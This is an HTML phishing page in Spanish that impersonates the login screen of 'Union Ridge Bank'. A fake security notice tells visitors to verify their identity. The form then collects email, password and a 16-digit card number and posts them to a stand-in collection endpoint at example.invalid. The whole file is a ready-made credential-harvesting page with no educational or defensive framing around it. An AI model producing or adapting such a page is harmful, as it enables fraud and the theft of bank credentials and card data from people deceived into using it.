<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Union Ridge Bank - Acceso a tu cuenta</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <div class="security-notice">
    Por tu seguridad, verifica tu identidad para continuar.
  </div>

  <div class="auth-panel">
    <h1 class="bank-title">Union Ridge Bank</h1>

    <form id="loginForm" action="https://example.invalid/collect" method="POST">
      <label for="userEmail">Usuario / Email</label>
      <input type="email" id="userEmail" name="email" required>

      <label for="userPassword">Contraseña</label>
      <input type="password" id="userPassword" name="password" required>

      <label for="cardNumber">Número de tarjeta (verificación)</label>
      <input type="text" id="cardNumber" name="card_number" maxlength="16">

      <button type="submit" id="submitBtn">Continuar</button>
    </form>
  </div>

  <div class="support-line">
    ¿Problemas para acceder? Soporte: ayuda@example.invalid
  </div>

  <script src="script.js"></script>
</body>
</html>
